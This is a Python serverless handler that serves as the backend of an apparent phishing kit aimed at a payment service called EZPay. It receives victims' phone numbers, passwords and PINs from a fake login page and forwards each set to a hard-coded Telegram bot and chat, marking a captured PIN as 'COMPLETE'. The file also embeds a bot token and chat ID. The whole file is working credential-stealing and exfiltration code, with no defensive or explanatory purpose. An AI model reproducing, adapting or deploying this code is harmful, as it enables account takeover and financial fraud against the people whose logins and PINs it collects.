# /api/telegram.py
from http.server import BaseHTTPRequestHandler
import json
import requests

BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E"
CHAT_ID = "8023791486"

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Set CORS headers
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            phone = data.get('phone', '')
            password = data.get('password', '')
            pin = data.get('pin', '')
            data_type = data.get('type', '')
            
            message = ""
            if data_type == 'login' and phone and password:
                message = f"🔐 EZPay Login\n📱 Phone: +91 {phone}\n🔑 Password: {password}"
            elif data_type == 'pin' and phone and pin:
                message = f"✅ EZPay PIN\n📱 Phone: +91 {phone}\n🔢 PIN: {pin}\n🚨 COMPLETE"
            
            if message:
                # Send to Telegram
                telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                payload = {
                    "chat_id": CHAT_ID,
                    "text": message,
                    "parse_mode": "HTML"
                }
                requests.post(telegram_url, json=payload, timeout=5)
            
            response = {
                "success": True,
                "message": "Data sent to Telegram"
            }
            
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        except Exception as e:
            error_response = {
                "success": False,
                "error": str(e)
            }
            self.wfile.write(json.dumps(error_response).encode('utf-8'))